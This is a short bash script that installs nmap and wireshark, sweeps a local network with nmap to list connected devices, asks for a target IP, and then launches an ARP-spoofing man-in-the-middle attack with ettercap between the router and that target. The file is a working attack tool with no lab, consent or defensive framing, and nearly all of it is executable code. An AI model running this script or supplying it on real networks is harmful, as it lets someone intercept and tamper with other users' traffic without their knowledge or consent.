#! /usr/bin/bash

#TODO: check if wireshark and etternet is installed

function check_dependencies {
    
    #Warning: The below if statement wont work if the package is installed already using 'snap'
    dpkg -s nmap &> /dev/null  

    if [ $? -ne 0 ]

        then
            echo "nmap not installed. Do you want to install nmap to continue? (y/n) ";
            read permission;

            if [ $permission ] && [ $permission == 'y' ]; then
                #install 'nmap' using apt
                sudo apt install nmap;

                #Install 'nmap' using snap
                #sudo snap install nmap;
                #sudo snap connect nmap:network-control;
            fi
        
    fi
    
    dpkg -s wireshark &> /dev/null
    
    if [ $? -ne 0 ]

        then
            echo "wireshark not installed. Do you want to install it to continue? (y/n) ";
            read permission;

            if [ $permission ] && [ $permission == 'y' ]; then
                #install 'nmap' using apt
                sudo apt install wireshark;

                
            fi
        
    fi
}
function split()
{
    readarray -d '/' -t strarr <<< $1 ;
    router_ip_without_sub_net_mask=${strarr[0]} ;
}


check_dependencies;


#Get the ip address of router along with subnet mask and interface
echo -e "\n"


ip r | grep default

echo -e "\nEnter ip address of the router along with subnet mask(example: 192.168.0.1/24 ):";
read ip_address_of_router;
#ip_address_of_router='192.168.0.1/24';

#Get the interface of the router
split $ip_address_of_router ;
interface=$(ip route get $router_ip_without_sub_net_mask | awk '{print $3}');
echo -e "\ninterface: $interface\n";

#Get all the connected devices in the router
sudo nmap -sn $ip_address_of_router;


echo -e "\nSelect the ip address of the target: (example: 192.168.0.127 ) ";
read target_ip_address;
#target_ip_address='192.168.0.127'

#Man in the middle attack
echo -e "\nMan in the middle attack initiated..."
sudo ettercap -T -S -i $interface -M arp:remote /$router_ip_without_sub_net_mask// /$target_ip_address//
